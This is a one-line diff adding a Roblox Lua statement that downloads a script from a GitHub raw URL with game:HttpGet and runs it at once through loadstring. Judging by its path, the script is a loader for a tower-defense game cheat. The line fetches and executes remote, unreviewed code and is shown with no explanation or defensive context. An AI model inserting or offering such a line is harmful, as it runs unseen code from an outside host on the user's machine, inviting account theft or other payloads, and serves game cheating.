@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/og-all-star-tower-defense-spam2-y0l3sjwlmd96q6.lua"))()
